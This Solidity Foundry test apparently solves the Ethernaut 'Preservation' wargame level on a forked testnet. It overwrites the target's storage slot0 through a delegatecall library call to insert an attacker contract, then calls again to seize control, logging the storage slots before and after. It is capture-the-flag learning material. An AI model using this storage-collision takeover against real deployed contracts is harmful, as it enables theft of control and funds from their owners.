// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";

import {Utils} from "test/utils/Utils.sol";

import {PreservationSolution} from "../PreservationSolution.sol";

// solhint-disable func-name-mixedcase, no-console, no-empty-blocks
contract PreservationForkTest is Test {
  address private user = 0xF580A030d2f0E9667aB3c5c8a51Da63f086Db564;
  address private preservationContract = 0xFF9fe4072432eBc7770e4652F5E6EeaF733ca5dA;

  // CONTRACTS ////////////////////////////////////////////////////////////////
  PreservationSolution private preservationSolution;

  // Initialize ///////////////////////////////////////////////////////////////
  function setUp() external {
    vm.createSelectFork(stdChains["optimism_goerli"].rpcUrl, 11087055);
  }

  /////////////////////////////////////////////////////////////////////////////
  //                                  TESTS                                  //
  /////////////////////////////////////////////////////////////////////////////

  function printSlots() internal {
    bytes32 slot0 = vm.load(address(preservationContract), bytes32(uint256(0)));
    bytes32 slot1 = vm.load(address(preservationContract), bytes32(uint256(1)));
    bytes32 slot2 = vm.load(address(preservationContract), bytes32(uint256(2)));
    bytes32 slot3 = vm.load(address(preservationContract), bytes32(uint256(3)));
    bytes32 slot4 = vm.load(address(preservationContract), bytes32(uint256(4)));
    bytes32 slot5 = vm.load(address(preservationContract), bytes32(uint256(5)));

    emit log_bytes32(slot0);
    emit log_bytes32(slot1);
    emit log_bytes32(slot2);
    emit log_bytes32(slot3);
    emit log_bytes32(slot4);

    console2.log("----------------------------------------------------------");
    console2.log("slot0: ", uint256(slot0));
    console2.log("slot1: ", uint256(slot1));
    console2.log("slot2: ", uint256(slot2));
    console2.log("slot3: ", uint256(slot3));
    console2.log("slot4: ", uint256(slot4));
    console2.log("----------------------------------------------------------");
  }

  function test_01_unlockContract() external {
    vm.startPrank(user);

    preservationSolution = new PreservationSolution();
    // printSlots();
    bytes32 slot0 = vm.load(address(preservationContract), bytes32(uint256(0)));
    bytes32 slot1 = vm.load(address(preservationContract), bytes32(uint256(1)));
    bytes32 slot2 = vm.load(address(preservationContract), bytes32(uint256(2)));

    emit log_bytes32(slot0);
    emit log_bytes32(slot1);
    emit log_bytes32(slot2);
    emit log_string("---------------------------------");

    // change slot0 to our attack contract address
    (bool _resLib1, ) = preservationContract.call(abi.encodeWithSignature("setFirstTime(uint256)", address(preservationSolution)));
    require(_resLib1);

    // in here we are attacking
    preservationContract.call(abi.encodeWithSignature("setFirstTime(uint256)", user));

    slot0 = vm.load(address(preservationContract), bytes32(uint256(0)));
    slot1 = vm.load(address(preservationContract), bytes32(uint256(1)));
    slot2 = vm.load(address(preservationContract), bytes32(uint256(2)));

    emit log_bytes32(slot0);
    emit log_bytes32(slot1);
    emit log_bytes32(slot2);

    vm.stopPrank();
  }
}
